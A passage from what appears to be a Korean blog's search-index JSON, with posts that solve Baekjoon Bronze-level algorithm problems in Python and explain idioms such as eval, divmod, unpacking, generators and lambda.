있다.","link":"/2021/02/04/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-15680%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 1712번 문제","text":"백준 1712번 문제손익분기점월드전자는 노트북을 제조하고 판매하는 회사이다. 노트북 판매 대수에 상관없이 매년 임대료, 재산세, 보험료, 급여 등 A만원의 고정 비용이 들며, 한 대의 노트북을 생산하는 데에는 재료비와 인건비 등 총 B만원의 가변 비용이 든다고 한다.예를 들어 A=1,000, B=70이라고 하자. 이 경우 노트북을 한 대 생산하는 데는 총 1,070만원이 들며, 열 대 생산하는 데는 총 1,700만원이 든다.노트북 가격이 C만원으로 책정되었다고 한다. 일반적으로 생산 대수를 늘려 가다 보면 어느 순간 총 수입(판매비용)이 총 비용(=고정비용+가변비용)보다 많아지게 된다. 최초로 총 수입이 총 비용보다 많아져 이익이 발생하는 지점을 손익분기점(BREAK-EVEN POINT)이라고 한다.A, B, C가 주어졌을 때, 손익분기점을 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/1712 12345a, b, c = map(int, input().split())for i in range(1, 12): print(a+b*i) print(c*i, '\\n') 123456789101112131415161718192021222324252627282930313233343536입력1000 70 170출력 결과1070170 1140340 1210510 1280680 1350850 14201020 14901190 15601360 16301530 17001700 17701870 문제를 이해하는데 좀 걸렸다.문제를 쉽게 풀이하자면, 노트북을 생산하는데 들어가는 고정 비용, 재료비와 인건비를 합친 가변 비용 두 비용을 더해서 노트북 생산 금액이 측정이 된다.예시대로, 고정 비용 - 1000, 가변 비용 - 70 이면, 노트북 2개를 생산하는 비용은 ** 고정 비용 + ( 가변 비용 * 2 ) **이라는 공식이 성립되고, 1140이라는 비용이 들게 된다. 판매값이 170이 측정이 될 때, 노트북 몇 대를 팔아야 생산 비용을 넘어설 수 있는지를 구하는 문제였다. 공식을 구하자면, ** 고정 비용 + (가변 비용 * X) &lt; 판매값 * X **이 성립이 된다.여기서 ** 가변 비용 * X *를 옆에 옮기면, ** 고정 비용 &lt; (판매값 - 가변 비용) \\ X **이 된다. 우리의 목표는 x를 구하는 것이 목적이므로, x만 남기고 옆으로 넘긴다.** 고정 비용 / (판매값 - 가변 비용) &lt; X **이라는 최종 공식이 구해지게 된다. 이 공식을 이용하여 문제풀이를 하겠다. 12345678a, b, c = map(int, input().split())if (c &lt;= b): d = -1else: d = a//(c-b)+1print(d) 여기서 더 풀이를 하자면, 판매값과 가변 비용의 크기 비교를 한 이유는 가변 비용의 크기가 판매값보다 크면, 공식이 음수로 되기 때문에 x가 0이라도 참이 된다. 그래서 예외 처리를 하였다. else문을 보면 공식에 +1를 한 모습을 볼 수 있다. +1은 소수점을 반올림을 한 경우를 생각하여 더해주었다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1712%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2420번 문제","text":"백준 브론즈4 2420번 문제사파리월드는 인터넷으로만 존재하는 미스테리한 나라이다. 사파리월드에는 2개의 서브도메인이 seunghwan.royal.gov.sw와 kyuhyun.royal.gov.sw 이 있는데, 이것이 couple.royal.gov.sw으로 합쳐질 것이다. 그러나 도메인 관리 센터 SWNIC(센터장: 김동규)에는 엄격한 룰이 있다. 두 서브도메인을 합칠 때, 유명도의 차이가 너무 차이나지 않을 경우에만 두 서브도메인을 결혼시키는 것이다. 서브도메인의 유명도는 정수이다. 두 서브도메인의 유명도가 주어졌을 때, 그 차이를 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2420 문제풀이12a, b = map(int, input().split())print(abs(a-b)) Abs 함수를 이용하여 문제 풀이를 하였다.Abs 함수는 절대값을 구하는 함수이다. 숏코딩 문제풀이1print(abs(eval(input().replace(' ','-')))) Eval 함수와 Replace 함수를 이용하여 문제풀이를 하였다.Eval 함수는 ::-2–5::라는 문자열을 받아서 계산할 것이다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2420%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2480번 문제","text":"백준 브론즈4 2480번 문제1에서부터 6까지의 눈을 가진 3개의 주사위를 던져서 다음과 같은 규칙에 따라 상금을 받는 게임이 있다. 1. 같은 눈이 3개가 나오면 10,000원+(같은 눈)1,000원의 상금을 받게 된다. 2. 같은 눈이 2개만 나오는 경우에는 1,000원+(같은 눈)*100원의 상금을 받게 된다. 3. 모두 다른 눈이 나오는 경우에는 (그 중 가장 큰 눈)*100원의 상금을 받게 된다.예를 들어, 3개의 눈 3, 3, 6이 주어지면 상금은 1,000+3100으로 계산되어 1,300원을 받게 된다. 또 3개의 눈이 2, 2, 2로 주어지면 10,000+21,000 으로 계산되어 12,000원을 받게 된다. 3개의 눈이 6, 2, 5로 주어지면 그중 가장 큰 값이 6이므로 6100으로 계산되어 600원을 상금으로 받게 된다.3개 주사위의 나온 눈이 주어질 때, 상금을 계산하는 프로그램을 작성 하시오. 문제풀이123456a = list(map(int, input().split()))if len(set(a)) == 3: print(max(a) * 100)elif len(set(a)) == 2: if a.count(a[0]) == 1: print(1000 + a[1] * 100) else: print(1000 + a[0] * 100)else: print(10000 + a[0] * 1000) Set 함수로 중복된 숫자를 제거하고, Len 함수로 List 안에 숫자의 갯수를 확인하여 중복 갯수를 확인하였다.중복 갯수가 2개인 경우, 중복된 값이 식에 들어가야함으로 별도로 어느 숫자가 중복인지 검사하여 결과를 구하였다. 숏코딩 문제풀이12a,b,c=sorted(input().split())print(['1'+b,c][a&lt;b&lt;c]+'000'[a&lt;c:]) 한번에 보고 이해하기 힘든 코드이다.Sorted 함수를 이용하여 입력받은 숫자들을 정렬하여 변수에 넣어줬다. 이러는 이유는 슬라이싱을 이용하기 위함이다. 문제의 조건은 밑과 같다 - 3개 동일 -&gt; 3개 중 아무 하나 - 2개 중복 -&gt; 중복된 숫자 - 중복 X -&gt; 가장 큰수 즉, 중복된 숫자와 가장 큰 수를 구해야하는게 이 문제의 핵심이다. ['1'+b, c][a&lt;b&lt;c] 이 코드에서 1은 중복된 숫자가 있을 경우 더해질 10000과 1000의 1를 뜻한다.이해가 안가는 사람도 있을 것이다.입력된 숫자가 ‘3 2 3’이면 변수에 넣어질 때 정렬이 됨으로 a = 2, b = 3, c = 3이 된다.변수가 str 타입이므로 숫자 더하기가 아닌 문자 더하기으로 계산이 되기 때문에 ['1'+b, c]은 ['13', 3]이 된다.그 후 중복이 있는지 없는지를 확인하였다. -&gt; [a&lt;b&lt;c]는 b=c 임으로 False가 나오게 된다. False은 0으로 취급할 수 있기 때문에 최종 나오는 결과는 13이 나오게 된다. 만약 중복값이 없다면 a&lt;b&lt;c가 True가 됨으로 가장 큰 수인 C가 나오게 된다. 위에 중복값이 있는지 없는지를 확인하였다. 이제 각 상황에 맞게 10000의 자리인지 1000의 자리인지 100의 자리인지를 확인해야한다. 이는 a&lt;c를 이용하여 확인하였다. 3개가 중복이면 a=c가 됨으로 False가 나오고 000이 더해지게 된다. 중복 2개 or 중복이 없으면, True가 나와서 00이 된다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2480%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2525번 문제","text":"백준 브론즈4 2525번 문제KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 분 단위로 자동적으로 계산한다.또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 분단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.Link : 2525번: 오븐 시계 문제풀이12345678910111213141516a, b= map(int, input().split())c = int(input())d = b+cif d &lt; 60: print(a, d)else: while True: a += 1 if a &gt; 23: a = 0 d = d-60 if d &lt; 60: break print(a, d) 무한루프와 조건문을 써서 해결했지만, 효율성은 너무 떨어지는 문제 풀이이다. 좀 더 간단하게 수정하겠다. 숏코딩 문제풀이12t = eval( input().replace(' ','*60+') ) + int( input() )print(t//60%24,t%60) 이 코드는 첫번째 입력값인 시와 분을 분 단위로 수정하여 두번째 입력값과 더한 후 시와 분으로 나누어 출력하였다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2525%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2530번 문제","text":"백준 브론즈4 2530번 문제KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 초 단위로 자동적으로 계산한다.또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 초 단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.2530번: 인공지능 시계 문제풀이1234a, b, c = map(int, input().split())d = int(input())e = a * 3600 + b * 60 + c + dprint(e//3600%24, e//60%60, e%60)","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2530%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2588번 문제","text":"백준 2588번 문제곱셈(세 자리 수) × (세 자리 수)는 다음과 같은 과정을 통하여 이루어진다. (1)과 (2)위치에 들어갈 세 자리 자연수가 주어질 때 (3), (4), (5), (6)위치에 들어갈 값을 구하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/2753 1234567num1, num2 = map(int, open(0))num3 = num1 * (num2 % 10)num4 = num1 * (num2 % 100 // 10)num5 = num1 * (num2 // 100)print(f'{num3}\\n{num4}\\n{num5}\\n{num1*num2}') 이 문제는 사칙연산만 안다면 풀 수 있으므로 자세한 설명은 넘어가겠다.","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2588%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2752번 문제","text":"백준 브론즈4 2752번 문제동규는 세수를 하다가 정렬이 하고싶어졌다.숫자 세 개를 생각한 뒤에, 이를 오름차순으로 정렬하고 싶어 졌다.숫자 세 개가 주어졌을 때, 가장 작은 수, 그 다음 수, 가장 큰 수를 출력하는 프로그램을 작성하시오. 문제풀이12a = map(int, input().split())print(*sorted(a)) Sorted 함수를 사용하여 정렬 후 출력하였다.print 함수 안에 있는 ::*::는 ::Asterisk::를 뜻하며, 컨테이너 타입의 데이터를 Unpacking할 때 쓴인다.쉽게 말해 리스트 안에 있는 모든 데이터를 밖으로 꺼내준다는 뜻으로 생각하면 된다. 숏코딩 문제풀이1print(*sorted(input().split(),key=int)) 굳이 설명을 할 필요가 없을 것 같아 코드 설명은 안하겠다. Sort 함수 Vs Sorted 함수Sort 함수 123a = [3, 2, 1]a.sort()print(a) # 출력 [1, 2, 3] Sorted 함수 123a = [3, 2, 1]print(sorted(a)) # 출력 [1, 2, 3]print(a) # 출력 [3, 2, 1] Sort 함수는 실제 리스트의 순서가 변경이 되며, Sorted 함수의 경우 실제 리스트의 순서는 변화가 없었다. 성능의 비교스택오버플로우에서 찾아보니, Sort 함수가 Sorted 함수보다 약 2% 빠르다는 결과를 알려주었습니다.","link":"/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2752%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 2753번 문제","text":"백준 2753번 문제윤년연도가 주어졌을 때, 윤년이면 1, 아니면 0을 출력하는 프로그램을 작성하시오.윤년은 연도가 4의 배수이면서, 100의 배수가 아닐 때 또는 400의 배수일 때이다.예를 들어, 2012년은 4의 배수이면서 100의 배수가 아니라서 윤년이다. 1900년은 100의 배수이고 400의 배수는 아니기 때문에 윤년이 아니다.하지만, 2000년은 400의 배수이기 때문에 윤년이다.Link : https://www.acmicpc.net/problem/2753 123a = int(input())if a%4 == 0 and a%100 != 0 or a%400 == 0: print(1)else: print(0)","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2753%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5532번 문제","text":"백준 브론즈4 5532번 문제상근이는 초등학교에 다닐 때, 방학 숙제를 남들보다 먼저 미리 하고 남은 기간을 놀았다. 방학 숙제는 수학과 국어 문제 풀기이다.방학은 총 L일이다. 수학은 총 B페이지, 국어는 총 A페이지를 풀어야 한다. 상근이는 하루에 국어를 최대 C페이지, 수학을 최대 D페이지 풀 수 있다.상근이가 겨울 방학동안 숙제를 하지 않고 놀 수 있는 최대 날의 수를 구하는 프로그램을 작성하시오.5532번: 방학 숙제 문제풀이12a = list(map(int, open(0)))print(a[0] - max([a[1]//a[3], a[1]//a[3]+1][a[1]%a[3]!=0], [a[2]//a[4], a[2]//a[4]+1][a[2]%a[4]!=0])) 사칙연산과 인덱싱을 이용한 문제풀이다.하지만 엄청 가독성이 떨어진다. Math 라이브러리를 이용하여 간단하게 수정하겠다.위 코드가 이해가 안 간다면, 10162번 문제풀이를 참고. 123import matha = list(map(int, open(0)))print(a[0] - max(math.ceil(a[1]/a[3]), math.ceil(a[2]/a[4]))) Math 라이브러리(수학 관련 라이브러리)의 Ceil 함수를 이용하여 간편하게 풀이하였다.Ceil 함수는 소수점이 있을 경우 올림을 해주는 함수이다. 이 기능을 이용하여 쓸데없는 인덱싱을 안 쓸 수 있었다. 숏코딩 문제풀이12a = list(map(int, open(0)))print(a[0]+min(-a[1]//a[3],-a[2]//a[4])) 이 코드는 기본 문제풀이와 같은 원리이지만, 추가적인 기능을 이용하였다.파이썬의 경우 음수일 경우 나눈 나머지는 올림처리가 된다는 것이다.양수에선 25 // 6은 4이지만, -25 // 6은 -5이다.","link":"/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5532%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 - 5543번 문제","text":"백준 5543번 문제상근날드상근날드에서 가장 잘 팔리는 메뉴는 세트 메뉴이다. 주문할 때, 자신이 원하는 햄버거와 음료를 하나씩 골라, 세트로 구매하면, 가격의 합계에서 50원을 뺀 가격이 세트 메뉴의 가격이 된다.햄버거는 총 3종류 상덕버거, 중덕버거, 하덕버거가 있고, 음료는 콜라와 사이다 두 종류가 있다.햄버거와 음료의 가격이 주어졌을 때, 가장 싼 세트 메뉴의 가격을 출력하는 프로그램을 작성하시오.Link : https://www.acmicpc.net/problem/5543 12345678menu = [ i for i in map(int, open(0)) ]sum = []for i in range(0,3): sum.append(menu[i] + menu[3]) sum.append(menu[i] + menu[4]) print(sorted(sum)[0]-50) list를 사용하여 문제해결을 하였다.하지만 많이 부족하다. 사실 최소값을 구하는 건 가장 작은 수 2개를 구해서 더해주면 되는데 위 방식은 모든 경우의 수를 구하여, 정렬시킨 것이라 비효율적이다.효율적으로 수정하겠다. 12*p,q,r = map(int,open(0))print(min(p)+min(q,r)-50) 2번째 코드는 위에 설명한 대로 최소값 2개를 구하여 더하는 코드이다.1번째 코드를 보면 좀 생소한 방식을 확인할 수 있다.*p,q,r = map(int, open(0))는 10개를 입력시 뒤에서 2개 빼고 앞의 8개는 p에 리스트로 저장이 된다.뒤의 2개는 q, r에 저장이 되어서 음료의 최소값을 구하기가 더 수월하였다. 12*p,q,r = map(int,open(0)) # 입력 : 1,2,3,4,5print(p) # 출력 : [1, 2, 3]","link":"/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5543%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈4 5596번 문제","text":"백준 5596번 문제대한고등학교에 재학 중인 민국이와 만세는 4과목(정보, 수학, 과학, 영어)에 대한 시험을 봤습니다. 민국이와 만세가 본 4과목의 점수를 입력하면, 민국이의 총점 S와 만세의 총점 T 중에서 큰 점수를 출력하는 프로그램을 작성하세요. 다만, 서로 동점일 때는 민국이의 총점 S를 출력하세요. 5596번: 시험 점수 문제풀이1234a = map(int, input().split())b = map(int, input().split())print(max(sum(a), sum(b))) Sum 함수에 List를 넣으면, 자동으로 List의 합계를 구해는 점을 이용하여 풀이하였다. 숏코딩 문제풀이1print(max(sum(map(int,i.split())) for i in open(0))) Open 함수와 Split 함수를 적절히 사용하여 숏코딩을 하였다.'100 80 70 60'를 입력하면, 바로 i.split()에 의하여 ['100', '80', '70', '60']으로 변하게 된다.이를 Map 함수를 이용하여 각 item를 int형으로 변환하게 된다. 나머지는 기존 문제풀이와 같다.","link":"/2021/02/02/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5596%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1000번 문제","text":"백준 1000번 문제A+BLink : https://www.acmicpc.net/problem/1000 1print(int(input())+int(input())) 간단하게 생각할 수 있는 코드이다.input로 값을 입력받아 int 함수를 이용하여 문자에서 정수로 데이터타입을 변경하여 더하여 print 함수를 이용하여 출력하였다. 이 코드를 좀 더 python스럽게 만들어 보자. 1print(eval('+'.join(input()))) eval, join 함수를 사용하여 python스럽게 아주 간단하게 변경되었다.join과 eval에 대하여 알아보자. 문자열 삽입(join)Link : https://wikidocs.net/13#join 문자열의 문자 사이에 문자를 삽입하는 함수이다. 1print('+'.join('1234')) # 1+2+3+4 출력 위와 같이 문자열인 1234의 문자 사이에 +를 삽입되었다.python스럽게 고친 코드도 이를 이용하여 입력 받은 문자열에 +를 삽입하였다.허나 이상한 부분이 있다. join은 문자열의 문자 사이에 문자를 넣은 함수이지 계산을 하는 함수는 아니다.그럼 어떻게 계산을 할 수 있을지는 eval함수에 답이 있다. evalLink : https://wikidocs.net/32#eval eval함수는 실행 가능한 문자열을 실행한 결과값을 돌려주는 마법의 함수이다. 1234print(&quot;'Hi' + '!!!'&quot;) # 'Hi' + '!!!' 출력print(eval(&quot;'Hi' + '!!!'&quot;)) # Hi!!! 출력print(eval('+'.join('1234'))) # 10 출력 위와 같이 실행 가능한 문자를 실행해주는 함수이다.자세한 예제를 보고 싶다면 programiz 사이트에서 참고하면 좋다. Link : https://www.programiz.com/python-programming/methods/built-in/eval","link":"/2020/11/06/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1001%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1271번 문제","text":"백준 1271번 문제엄청난 부자2link : https://www.acmicpc.net/problem/1271 12a, b = map(int, input().split())print(f'{a//b}\\n{a%b}') 1001번 문제와 같은 방식으로 풀이를 했다.다만 틀린 점은 print함수의 문자열 앞에 f가 있다는 점이다.f의 뜻은 fomat이라는 뜻이다. 원래 이 기능은 생긴지 얼마 안되었다.이 기능이 없기 전까지는 print(‘{0}\\n{1}’.fomat(a//b, a%b))와 같이 fomat함수를 사용하였다.하지만 가독성이 떨어져서 문자열 앞에 f를 표시하는 것으로 변경되었고, 문자열 안에 바로 변수를 선언하여서 가독성을 높였다. 이제 좀 더 python스럽게 변경해보자. 1print(*divmod(*map(int,input().split()))) 특이한 것이 있다. 저 *은 무엇인가?? 곱하기인가?아니다. *은 파이썬이 지원하는 많은 연산자 중 하나인 Asterisk이다. Asterisk파이썬에서는 *는 곱셈 이상의 여러 의미를 갖는 연산이 가능케한다. 그 중 위의 코드는 컨테이너 타입의 데이터를 Unpacking할 때 쓰이는 Asterisk이다. 12345print('None Asterlisk : ', map(int, input().split()), '\\n')# None Asterlisk : &lt;map object at 0x10e4f20a0&gt; 출력print('Asterlisk : ', *map(int, input().split()), '\\n')# Asterlisk : 100 10 출력 123456a = [1, 2, 3, 4]print('None Asterlisk : ', a, '\\n')# None Asterlisk : [1, 2, 3, 4] print('Asterlisk : ', *a, '\\n')# Asterlisk : 1 2 3 4 예시 코드를 보니 아주 명확하게 구별이 가능했다.혹시 더 알아보고 싶으면 아래의 링크로 알아보면 된다.link : https://mingrammer.com/understanding-the-asterisk-of-python/ *은 해결했으니, divmod함수를 알아보자. divmodlink : https://wikidocs.net/32#divmod divmod함수는 이름 뜻대로 두 개의 인자값을 나눈 몫과 나머지를 튜플 형태로 return 해주는 함수이다. 12345print(divmod(7,3))# (2, 1) 출력print(divmod(100, 10))# (10, 0) 출력","link":"/2020/11/08/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1271%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 1550번 문제","text":"백준 1550번 문제16진수link : https://www.acmicpc.net/problem/1550 1print(int(input(), 16)) int함수에 옵션을 주어서 간단하게 문제를 해결하였다. int함수의 옵션은 밑의 주소에서 확인하면 된다.link : https://wikidocs.net/32#int","link":"/2020/11/09/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-1550%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2338번 문제","text":"백준 2338번 문제긴자리 계산link : https://www.acmicpc.net/problem/2338 12a, b = map(int, input().split())print(f'{a+b}\\n{a-b}\\n{a*b}') 1271번 문제풀이 방식으로 문제 풀이를 하였다. 이렇게 제출해도 정답으로 인정 받지만, 예제 입력을 보면 한 줄이 아닌 두 줄로 입력을 하고 있다. 이점을 걸리신 분들은 다음과 같은 방식으로 코드를 수정하면 된다. 12a, b = map(int, open(0))print(f'{a+b}\\n{a-b}\\n{a*b}') 이 방식은 정해진 변수에 계속 입력을 받을 수 있고, stdout방식이 아닌 EOF방식으로 출력이 된다.stdout방식과 EOF방식이 무엇일까?두 개의 방식을 설명하기 앞서 선행되어야 하는 것이 입출력이 무엇인지를 알아야한다. 입출력쉽게 말해 프로그램에게 데이터를 주는 것이 입력이고, 데이터를 모니터로 보여주게 하는 것이 출력이다. 스트림우리가 데이터를 입력할 때 주로 무엇을 사용할까요? 바로 키보드와 마우스입니다.키보드와 마우스를 사용하여 프로그램에게 데이터를 전달해야하는데 전달해주는 것이 바로 **표준 입력 스트림(stdin)**입니다. 프로그램에서 모니터, 프린터로 전달하는 것은 **표준 출력 스트림(stdout)**이라고 합니다. 이 외에도 오류 출력용인 **표준 에러 스트림(stderr)**가 있습니다. 이것들은 input함수, print함수를 사용하면 생성이되고 입력과 출력이 끝나면 자동으로 종료가 됩니다. EOFEOF(End Of File)은 더 이상 데이터가 없음을 의미합니다.왜 open(0)은 EOF방식 출력이라고 제가 표현 했을까요? open(0)은 입력 받는 것이 무한 반복 하기 때문입니다.그 때문에 프로그램에게 EOF을 알려 줘야 무한 입력이 끝나고, 값이 출력될 수 있기 때문에 EOF방식 출력이라고 표현했습니다. – 출론 –그럼 왜 open(0)이 무한 입력이 될까요?open함수는 파일을 읽기 위해 주로 사용되는 함수입니다. 즉, 파일 입력 함수이죠.open함수의 대표적인 인자값은 open(file, mode)입니다.그런데 파일이 0이다? open함수 입장에서는 읽을 데이터가 없으니 직접 데이터를 입력하라고 입력창을 띄어주는 것 같습니다. 이에 대해서는 python의 open함수 코드를 열어봐서 분석할 예정입니다.","link":"/2020/11/09/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2338%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2475번 문제","text":"백준 2475번 문제검증수link : https://www.acmicpc.net/problem/2475 12a, b, c, e, f = map(int, input().split())print((a**2 + b**2 + c**2 + e**2 + f**2)%10) **은 제곱근을 의미한다. a**2 =&gt; a^2를 의미 위 코드를 python스럽게 변경해보자. 1print( sum( a**2 for a in map(int, input().split()) )%10 ) 보기 좋게 한 줄로 표현이 되었다.근데 이상하게 print함수 안에 for문이 들어가 있다.이 형식은 제너레이터 표현라고 한다. itertorlink : https://bluese05.tistory.com/55 itertor - 제너레이터 - 제너레이터 표현 순으로 봐야 좀 더 이해가 쉽다. itertor은 next 메소드로 데이터를 순차적으로 호출 가능한 object이다. 12345678x = [1, 2, 3]print(type(x), '\\n') # &lt;class 'list'&gt; 출력y = iter(x)print(type(y), '\\n') #&lt;class 'list_iterator'&gt; for i in range(4): print(next(y)) # 1 2 3 출력 이와 같이 iter함수를 사용하여 iterator 형식으로 변환할 수 있다.하지만 우리는 반복문을 쓸 때 next 메소드를 쓴 적이 없다.이유는 파이썬 내부에서 임시로 list를 iterator로 자동 변환해주기 때문이다. generatorlink : https://bluese05.tistory.com/56 제너레이터는 iterator를 반환하는 함수이다.제너레이터는 일반적인 함수와 비슷하게 보이지만, 차이점이 있다.yield라는 존재가 그 차이점이다. 12345678910111213141516171819202122232425def ex(n): i = 0 while i &lt; n: yield i i += 1 while i &gt; n: yield print(i, 'no!!') break return idef test(): a = 10000 return aprint(*ex(-2), '\\n') # 0 no!!# None 출력print(*ex(3), '\\n') # 0 1 2 출력 print(i, '\\n') # 3 출력print(test()) # 10000 출력print(a) # 0 출력 yield함수가 끝나면 함수 안의 변수들은 메모리 상에서 clear된다.하지만 yield를 사용한 경우는 다른 형식으로 흘려간다.함수에서 yield를 만나면, 해당 함수는 그 상태로 정지가 되어 next 메소드를 호출한 쪽으로 yield를 전달하게 된다.이 후 해당 함수는 종료되는 것이 아니라, 함수 내부 데이터가 메모리에 그대로 유지하고 실행된다. 위의 예제 코드에서 ex함수가 종료되어도 ex함수의 i 변수의 데이터가 메모리에 남아 있는 것을 알 수 있다. generator expreession제너레이터 표현은 제너레이터를 쉽게 사용할 수 있도록 해준다.list comprehension과 비슷하지만, [] 대신 ()를 사용하면 된다. 1234567891011121314151617s = [1,2,3,4,5]print('--list comprehension--')[print(i) for i in s]print('\\n')# --list comprehension--# 1# 2# 3# 4# 5 출력print('--generator expreession--')(print(i) for i in s)# --generator expreession--# &lt;generator object &lt;genexpr&gt; at 0x113b3a890&gt; 출력 복잡한데 왜 사용할까?사용하는 이유는 성능 때문이다. 일반적인 for문을 돌리는 것보다 generator expreession과 list comprehension형식으로 돌리는게 속도와 메모리가 성능이 좋다. 다른 방식들도 있는데 이는 밑의 링크를 참고하면 된다.link : https://mingrammer.com/introduce-comprehension-of-python/","link":"/2020/11/11/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2475%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2557 &amp; 2558번 문제","text":"백준 2557번 문제Hello Worldlink : https://www.acmicpc.net/problem/2557 1print('Hello World!') 백준 2558번 문제A+B - 2link : https://www.acmicpc.net/problem/2558 1print(sum(a for a in map(int, input().split()))) 1print(sum(map(int, open(0)))) 각각 코드는 2475번, 2338번 문제 코드를 활용하여 문제 풀이를 하였다.","link":"/2020/11/13/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2557%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2845번 문제","text":"백준 2845번 문제파티가 끝나고 난 뒤link : https://www.acmicpc.net/problem/2845 123a = [b for b in map(int, open(0))]c = a[0]*a[1]print(a[2]-c, a[3]-c, a[4]-c, a[5]-c, a[6]-c) 2338번 문제 풀이를 응용하여 풀이를 하였다.하지만 python스러운 코드는 아니다. 좀 더 변경하겠다. 1234r = lambda : map(int, input().split())A,B = r()[print(x-A*B) for x in r()] lambda함수를 이용하여 python스럽게 코드를 수정하였다. lambdalink : https://wikidocs.net/24#lambda lambda함수는 쉽게 말하면 함수와 동일한 역할을 한다. 12345def 프린트입니다(a): return print(a)s = '함수를 사용하는 겁니다.'프린트입니다(s) # 함수를 사용하는 겁니다. 출력 123test = lambda a: print(a)s = 'lambda를 사용하는 겁니다.'test(s) # lambda를 사용하는 겁니다. 이와 같이 구현이 가능하다.주로 lambda는 함수를 구현할 정도로 복잡하지 않거나 함수를 사용할 수 없는 곳에 주로 쓰인다.","link":"/2020/11/13/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2845%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 2914번 문제","text":"백준 2914번 문제저작권Link : https://www.acmicpc.net/problem/2914 12a, b = map(int, input().split())print(a * (b-1) + 1) b는 반올림이 되었다고 하니 -1를 해주고, a와 곱해집니다.그 후 +1를 하는데 그 이유는 잘 모르겠다.예제 출력을 보고 +1를 해줬는데 그게 정답이였다. 이 이분은 알아보고 수정하겠다.","link":"/2020/12/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-2914%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 3003번 문제","text":"백준 3003번 문제킹, 퀸, 룩, 비숍, 나이트, 폰Link : https://www.acmicpc.net/problem/3003 1234a = [1, 1, 2, 2, 2, 8]b = list(map(int, input().split()))print( *[a[i]-b[i] for i in range(6)] ) 2475번 문제 풀이를 유용했으나 좀 부족하다.그래서 python스럽게 